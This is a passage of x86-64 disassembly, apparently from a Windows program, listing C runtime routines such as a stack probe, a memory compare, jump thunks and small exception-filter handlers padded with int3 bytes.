   14000e6d6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000e6dd:	00 00 00 
   14000e6e0:	48 83 ec 10          	sub    $0x10,%rsp
   14000e6e4:	4c 89 14 24          	mov    %r10,(%rsp)
   14000e6e8:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   14000e6ed:	4d 33 db             	xor    %r11,%r11
   14000e6f0:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   14000e6f5:	4c 2b d0             	sub    %rax,%r10
   14000e6f8:	4d 0f 42 d3          	cmovb  %r11,%r10
   14000e6fc:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   14000e703:	00 00 
   14000e705:	4d 3b d3             	cmp    %r11,%r10
   14000e708:	73 16                	jae    0x14000e720
   14000e70a:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   14000e710:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   14000e717:	41 c6 03 00          	movb   $0x0,(%r11)
   14000e71b:	4d 3b d3             	cmp    %r11,%r10
   14000e71e:	75 f0                	jne    0x14000e710
   14000e720:	4c 8b 14 24          	mov    (%rsp),%r10
   14000e724:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   14000e729:	48 83 c4 10          	add    $0x10,%rsp
   14000e72d:	c3                   	ret
   14000e72e:	cc                   	int3
   14000e72f:	cc                   	int3
   14000e730:	cc                   	int3
   14000e731:	cc                   	int3
   14000e732:	cc                   	int3
   14000e733:	cc                   	int3
   14000e734:	cc                   	int3
   14000e735:	cc                   	int3
   14000e736:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000e73d:	00 00 00 
   14000e740:	48 2b d1             	sub    %rcx,%rdx
   14000e743:	49 83 f8 08          	cmp    $0x8,%r8
   14000e747:	72 22                	jb     0x14000e76b
   14000e749:	f6 c1 07             	test   $0x7,%cl
   14000e74c:	74 14                	je     0x14000e762
   14000e74e:	66 90                	xchg   %ax,%ax
   14000e750:	8a 01                	mov    (%rcx),%al
   14000e752:	3a 04 11             	cmp    (%rcx,%rdx,1),%al
   14000e755:	75 2c                	jne    0x14000e783
   14000e757:	48 ff c1             	inc    %rcx
   14000e75a:	49 ff c8             	dec    %r8
   14000e75d:	f6 c1 07             	test   $0x7,%cl
   14000e760:	75 ee                	jne    0x14000e750
   14000e762:	4d 8b c8             	mov    %r8,%r9
   14000e765:	49 c1 e9 03          	shr    $0x3,%r9
   14000e769:	75 1f                	jne    0x14000e78a
   14000e76b:	4d 85 c0             	test   %r8,%r8
   14000e76e:	74 0f                	je     0x14000e77f
   14000e770:	8a 01                	mov    (%rcx),%al
   14000e772:	3a 04 11             	cmp    (%rcx,%rdx,1),%al
   14000e775:	75 0c                	jne    0x14000e783
   14000e777:	48 ff c1             	inc    %rcx
   14000e77a:	49 ff c8             	dec    %r8
   14000e77d:	75 f1                	jne    0x14000e770
   14000e77f:	48 33 c0             	xor    %rax,%rax
   14000e782:	c3                   	ret
   14000e783:	1b c0                	sbb    %eax,%eax
   14000e785:	83 d8 ff             	sbb    $0xffffffff,%eax
   14000e788:	c3                   	ret
   14000e789:	90                   	nop
   14000e78a:	49 c1 e9 02          	shr    $0x2,%r9
   14000e78e:	74 37                	je     0x14000e7c7
   14000e790:	48 8b 01             	mov    (%rcx),%rax
   14000e793:	48 3b 04 11          	cmp    (%rcx,%rdx,1),%rax
   14000e797:	75 5b                	jne    0x14000e7f4
   14000e799:	48 8b 41 08          	mov    0x8(%rcx),%rax
   14000e79d:	48 3b 44 11 08       	cmp    0x8(%rcx,%rdx,1),%rax
   14000e7a2:	75 4c                	jne    0x14000e7f0
   14000e7a4:	48 8b 41 10          	mov    0x10(%rcx),%rax
   14000e7a8:	48 3b 44 11 10       	cmp    0x10(%rcx,%rdx,1),%rax
   14000e7ad:	75 3d                	jne    0x14000e7ec
   14000e7af:	48 8b 41 18          	mov    0x18(%rcx),%rax
   14000e7b3:	48 3b 44 11 18       	cmp    0x18(%rcx,%rdx,1),%rax
   14000e7b8:	75 2e                	jne    0x14000e7e8
   14000e7ba:	48 83 c1 20          	add    $0x20,%rcx
   14000e7be:	49 ff c9             	dec    %r9
   14000e7c1:	75 cd                	jne    0x14000e790
   14000e7c3:	49 83 e0 1f          	and    $0x1f,%r8
   14000e7c7:	4d 8b c8             	mov    %r8,%r9
   14000e7ca:	49 c1 e9 03          	shr    $0x3,%r9
   14000e7ce:	74 9b                	je     0x14000e76b
   14000e7d0:	48 8b 01             	mov    (%rcx),%rax
   14000e7d3:	48 3b 04 11          	cmp    (%rcx,%rdx,1),%rax
   14000e7d7:	75 1b                	jne    0x14000e7f4
   14000e7d9:	48 83 c1 08          	add    $0x8,%rcx
   14000e7dd:	49 ff c9             	dec    %r9
   14000e7e0:	75 ee                	jne    0x14000e7d0
   14000e7e2:	49 83 e0 07          	and    $0x7,%r8
   14000e7e6:	eb 83                	jmp    0x14000e76b
   14000e7e8:	48 83 c1 08          	add    $0x8,%rcx
   14000e7ec:	48 83 c1 08          	add    $0x8,%rcx
   14000e7f0:	48 83 c1 08          	add    $0x8,%rcx
   14000e7f4:	48 8b 0c 0a          	mov    (%rdx,%rcx,1),%rcx
   14000e7f8:	48 0f c8             	bswap  %rax
   14000e7fb:	48 0f c9             	bswap  %rcx
   14000e7fe:	48 3b c1             	cmp    %rcx,%rax
   14000e801:	1b c0                	sbb    %eax,%eax
   14000e803:	83 d8 ff             	sbb    $0xffffffff,%eax
   14000e806:	c3                   	ret
   14000e807:	cc                   	int3
   14000e808:	cc                   	int3
   14000e809:	cc                   	int3
   14000e80a:	cc                   	int3
   14000e80b:	cc                   	int3
   14000e80c:	cc                   	int3
   14000e80d:	cc                   	int3
   14000e80e:	cc                   	int3
   14000e80f:	cc                   	int3
   14000e810:	cc                   	int3
   14000e811:	cc                   	int3
   14000e812:	cc                   	int3
   14000e813:	cc                   	int3
   14000e814:	cc                   	int3
   14000e815:	cc                   	int3
   14000e816:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000e81d:	00 00 00 
   14000e820:	ff e0                	jmp    *%rax
   14000e822:	cc                   	int3
   14000e823:	cc                   	int3
   14000e824:	cc                   	int3
   14000e825:	cc                   	int3
   14000e826:	cc                   	int3
   14000e827:	cc                   	int3
   14000e828:	cc                   	int3
   14000e829:	cc                   	int3
   14000e82a:	cc                   	int3
   14000e82b:	cc                   	int3
   14000e82c:	cc                   	int3
   14000e82d:	cc                   	int3
   14000e82e:	cc                   	int3
   14000e82f:	cc                   	int3
   14000e830:	cc                   	int3
   14000e831:	cc                   	int3
   14000e832:	cc                   	int3
   14000e833:	cc                   	int3
   14000e834:	cc                   	int3
   14000e835:	cc                   	int3
   14000e836:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000e83d:	00 00 00 
   14000e840:	ff 25 12 0c 00 00    	jmp    *0xc12(%rip)        # 0x14000f458
   14000e846:	cc                   	int3
   14000e847:	cc                   	int3
   14000e848:	cc                   	int3
   14000e849:	cc                   	int3
   14000e84a:	cc                   	int3
   14000e84b:	cc                   	int3
   14000e84c:	cc                   	int3
   14000e84d:	cc                   	int3
   14000e84e:	cc                   	int3
   14000e84f:	cc                   	int3
   14000e850:	40 55                	rex push %rbp
   14000e852:	48 83 ec 20          	sub    $0x20,%rsp
   14000e856:	48 8b ea             	mov    %rdx,%rbp
   14000e859:	48 8b 01             	mov    (%rcx),%rax
   14000e85c:	48 8b d1             	mov    %rcx,%rdx
   14000e85f:	8b 08                	mov    (%rax),%ecx
   14000e861:	e8 e6 70 ff ff       	call   0x14000594c
   14000e866:	90                   	nop
   14000e867:	48 83 c4 20          	add    $0x20,%rsp
   14000e86b:	5d                   	pop    %rbp
   14000e86c:	c3                   	ret
   14000e86d:	cc                   	int3
   14000e86e:	40 55                	rex push %rbp
   14000e870:	48 8b ea             	mov    %rdx,%rbp
   14000e873:	48 8b 01             	mov    (%rcx),%rax
   14000e876:	33 c9                	xor    %ecx,%ecx
   14000e878:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000e87e:	0f 94 c1             	sete   %cl
   14000e881:	8b c1                	mov    %ecx,%eax
   14000e883:	5d                   	pop    %rbp
   14000e884:	c3                   	ret
   14000e885:	cc                   	int3
   14000e886:	40 53                	rex push %rbx
   14000e888:	55                   	push   %rbp
   14000e889:	48 83 ec 28          	sub    $0x28,%rsp
   14000e88d:	48 8b ea             	mov    %rdx,%rbp
   14000e890:	48 89 4d 38          	mov    %rcx,0x38(%rbp)
   14000e894:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
   14000e898:	80 7d 58 00          	cmpb   $0x0,0x58(%rbp)
   14000e89c:	74 6c                	je     0x14000e90a
   14000e89e:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000e8a2:	48 8b 08             	mov    (%rax),%rcx
   14000e8a5:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   14000e8a9:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000e8ad:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   14000e8b3:	75 55                	jne    0x14000e90a
   14000e8b5:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000e8b9:	83 78 18 04          	cmpl   $0x4,0x18(%rax)
   14000e8bd:	75 4b                	jne    0x14000e90a
   14000e8bf:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000e8c3:	81 78 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rax)
   14000e8ca:	74 1a                	je     0x14000e8e6
   14000e8cc:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000e8d0:	81 78 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rax)
   14000e8d7:	74 0d                	je     0x14000e8e6
   14000e8d9:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000e8dd:	81 78 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rax)
   14000e8e4:	75 24                	jne    0x14000e90a
   14000e8e6:	e8 11 62 ff ff       	call   0x140004afc
   14000e8eb:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   14000e8ef:	48 89 48 20          	mov    %rcx,0x20(%rax)
   14000e8f3:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000e8f7:	48 8b 58 08          	mov    0x8(%rax),%rbx
   14000e8fb:	e8 fc 61 ff ff       	call   0x140004afc
   14000e900:	48 89 58 28          	mov    %rbx,0x28(%rax)
   14000e904:	e8 47 83 ff ff       	call   0x140006c50
   14000e909:	90                   	nop
   14000e90a:	c7 45 20 00 00 00 00 	movl   $0x0,0x20(%rbp)
   14000e911:	8b 45 20             	mov    0x20(%rbp),%eax
   14000e914:	48 83 c4 28          	add    $0x28,%rsp
   14000e918:	5d                   	pop    %rbp
   14000e919:	5b                   	pop    %rbx
   14000e91a:	c3                   	ret
   14000e91b:	cc                   	int3
   14000e91c:	40 55                	rex push %rbp
   14000e91e:	48 83 ec 20          	sub    $0x20,%rsp
   14000e922:	48 8b ea             	mov    %rdx,%rbp
   14000e925:	33 c9                	xor    %ecx,%ecx
   14000e927:	48 83 c4 20          	add    $0x20,%rsp
   14000e92b:	5d                   	pop    %rbp
   14000e92c:	e9 fb 94 ff ff       	jmp    0x140007e2c
   14000e931:	cc                   	int3
   14000e932:	40 55                	rex push %rbp
   14000e934:	48 83 ec 20          	sub    $0x20,%rsp
   14000e938:	48 8b ea             	mov    %rdx,%rbp
   14000e93b:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000e93f:	8b 08                	mov    (%rax),%ecx
   14000e941:	48 83 c4 20          	add    $0x20,%rsp
   14000e945:	5d                   	pop    %rbp
   14000e946:	e9 e1 94 ff ff       	jmp    0x140007e2c
   14000e94b:	cc                   	int3
   14000e94c:	40 55                	rex push %rbp
   14000e94e:	48 83 ec 20          	sub    $0x20,%rsp
   14000e952:	48 8b ea             	mov    %rdx,%rbp
   14000e955:	48 8b 01             	mov    (%rcx),%rax
   14000e958:	8b 08                	mov    (%rax),%ecx
   14000e95a:	e8 e9 79 ff ff       	call   0x140006348
   14000e95f:	90                   	nop
   14000e960:	48 83 c4 20          	add    $0x20,%rsp
   14000e964:	5d                   	pop    %rbp
   14000e965:	c3                   	ret
   14000e966:	cc                   	int3
   14000e967:	40 55                	rex push %rbp
   14000e969:	48 83 ec 20          	sub    $0x20,%rsp
   14000e96d:	48 8b ea             	mov    %rdx,%rbp
   14000e970:	48 8b 45 58          	mov    0x58(%rbp),%rax
   14000e974:	8b 08                	mov    (%rax),%ecx
   14000e976:	48 83 c4 20          	add    $0x20,%rsp
   14000e97a:	5d                   	pop    %rbp
   14000e97b:	e9 ac 94 ff ff       	jmp    0x140007e2c
   14000e980:	cc                   	int3
   14000e981:	40 55                	rex push %rbp
   14000e983:	48 83 ec 20          	sub    $0x20,%rsp
   14000e987:	48 8b ea             	mov    %rdx,%rbp
   14000e98a:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000e98f:	48 83 c4 20          	add    $0x20,%rsp
   14000e993:	5d                   	pop    %rbp
   14000e994:	e9 93 94 ff ff       	jmp    0x140007e2c
   14000e999:	cc                   	int3
   14000e99a:	40 55                	rex push %rbp
   14000e99c:	48 83 ec 20          	sub    $0x20,%rsp
   14000e9a0:	48 8b ea             	mov    %rdx,%rbp
   14000e9a3:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000e9a8:	48 83 c4 20          	add    $0x20,%rsp
   14000e9ac:	5d                   	pop    %rbp
   14000e9ad:	e9 7a 94 ff ff       	jmp    0x140007e2c
   14000e9b2:	cc                   	int3
   14000e9b3:	40 55                	rex push %rbp
   14000e9b5:	48 83 ec 20          	sub    $0x20,%rsp
   14000e9b9:	48 8b ea             	mov    %rdx,%rbp
   14000e9bc:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000e9c1:	48 83 c4 20          	add    $0x20,%rsp
   14000e9c5:	5d                   	pop    %rbp
   14000e9c6:	e9 61 94 ff ff       	jmp    0x140007e2c
   14000e9cb:	cc                   	int3
   14000e9cc:	40 55                	rex push %rbp
   14000e9ce:	48 83 ec 20          	sub    $0x20,%rsp
   14000e9d2:	48 8b ea             	mov    %rdx,%rbp
   14000e9d5:	80 7d 70 00          	cmpb   $0x0,0x70(%rbp)
   14000e9d9:	74 0b                	je     0x14000e9e6
   14000e9db:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000e9e0:	e8 47 94 ff ff       	call   0x140007e2c
   14000e9e5:	90                   	nop
   14000e9e6:	48 83 c4 20          	add    $0x20,%rsp
   14000e9ea:	5d                   	pop    %rbp
   14000e9eb:	c3                   	ret
   14000e9ec:	cc                   	int3
   14000e9ed:	40 55                	rex push %rbp
   14000e9ef:	48 83 ec 20          	sub    $0x20,%rsp
   14000e9f3:	48 8b ea             	mov    %rdx,%rbp
   14000e9f6:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   14000e9fa:	48 8b 09             	mov    (%rcx),%rcx
   14000e9fd:	48 83 c4 20          	add    $0x20,%rsp
   14000ea01:	5d                   	pop    %rbp
   14000ea02:	e9 91 c5 ff ff       	jmp    0x14000af98
   14000ea07:	cc                   	int3
   14000ea08:	40 55                	rex push %rbp
   14000ea0a:	48 83 ec 20          	sub    $0x20,%rsp
   14000ea0e:	48 8b ea             	mov    %rdx,%rbp
   14000ea11:	48 8b 85 98 00 00 00 	mov    0x98(%rbp),%rax
   14000ea18:	8b 08                	mov    (%rax),%ecx
   14000ea1a:	48 83 c4 20          	add    $0x20,%rsp
   14000ea1e:	5d                   	pop    %rbp
   14000ea1f:	e9 08 94 ff ff       	jmp    0x140007e2c
   14000ea24:	cc                   	int3
   14000ea25:	40 55                	rex push %rbp
   14000ea27:	48 83 ec 20          	sub    $0x20,%rsp
   14000ea2b:	48 8b ea             	mov    %rdx,%rbp
   14000ea2e:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000ea32:	8b 08                	mov    (%rax),%ecx
   14000ea34:	48 83 c4 20          	add    $0x20,%rsp
   14000ea38:	5d                   	pop    %rbp
   14000ea39:	e9 42 b0 ff ff       	jmp    0x140009a80
   14000ea3e:	cc                   	int3
   14000ea3f:	40 55                	rex push %rbp
   14000ea41:	48 83 ec 20          	sub    $0x20,%rsp
   14000ea45:	48 8b ea             	mov    %rdx,%rbp
   14000ea48:	8b 4d 50             	mov    0x50(%rbp),%ecx
   14000ea4b:	48 83 c4 20          	add    $0x20,%rsp
   14000ea4f:	5d                   	pop    %rbp
   14000ea50:	e9 2b b0 ff ff       	jmp    0x140009a80
   14000ea55:	cc                   	int3
   14000ea56:	40 55                	rex push %rbp
   14000ea58:	48 83 ec 20          	sub    $0x20,%rsp
   14000ea5c:	48 8b ea             	mov    %rdx,%rbp
   14000ea5f:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000ea64:	48 83 c4 20          	add    $0x20,%rsp
   14000ea68:	5d                   	pop    %rbp
   14000ea69:	e9 be 93 ff ff       	jmp    0x140007e2c
   14000ea6e:	cc                   	int3
   14000ea6f:	40 55                	rex push %rbp
   14000ea71:	48 83 ec 20          	sub    $0x20,%rsp
   14000ea75:	48 8b ea             	mov    %rdx,%rbp
   14000ea78:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   14000ea7c:	48 83 c4 20          	add    $0x20,%rsp
   14000ea80:	5d                   	pop    %rbp
   14000ea81:	e9 12 c5 ff ff       	jmp    0x14000af98
   14000ea86:	cc                   	int3
   14000ea87:	40 55                	rex push %rbp
   14000ea89:	48 83 ec 20          	sub    $0x20,%rsp
   14000ea8d:	48 8b ea             	mov    %rdx,%rbp
   14000ea90:	48 8b 01             	mov    (%rcx),%rax
   14000ea93:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000ea99:	74 0c                	je     0x14000eaa7
   14000ea9b:	81 38 1d 00 00 c0    	cmpl   $0xc000001d,(%rax)
   14000eaa1:	74 04                	je     0x14000eaa7
   14000eaa3:	33 c0                	xor    %eax,%eax
   14000eaa5:	eb 05                	jmp    0x14000eaac
   14000eaa7:	b8 01 00 00 00       	mov    $0x1,%eax
   14000eaac:	48 83 c4 20          	add    $0x20,%rsp
   14000eab0:	5d                   	pop    %rbp
   14000eab1:	c3                   	ret
   14000eab2:	cc                   	int3
   14000eab3:	cc                   	int3
   14000eab4:	cc                   	int3
   14000eab5:	cc                   	int3
   14000eab6:	cc                   	int3
   14000eab7:	cc                   	int3
   14000eab8:	cc                   	int3
   14000eab9:	cc                   	int3
   14000eaba:	cc                   	int3
   14000eabb:	cc                   	int3
   14000eabc:	cc                   	int3
   14000eabd:	cc                   	int3
   14000eabe:	cc                   	int3
   14000eabf:	cc                   	int3
   14000eac0:	40 55                	rex push %rbp
   14000eac2:	48 83 ec 20          	sub    $0x20,%rsp
   14000eac6:	48 8b ea             	mov    %rdx,%rbp
   14000eac9:	48 8b 01             	mov    (%rcx),%rax
   14000eacc:	33 c9                	xor    %ecx,%ecx
   14000eace:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000ead4:	0f 94 c1             	sete   %cl
   14000ead7:	8b c1                	mov    %ecx,%eax
   14000ead9:	48 83 c4 20          	add    $0x20,%rsp
   14000eadd:	5d                   	pop    %rbp
   14000eade:	c3                   	ret
   14000eadf:	cc                   	int3
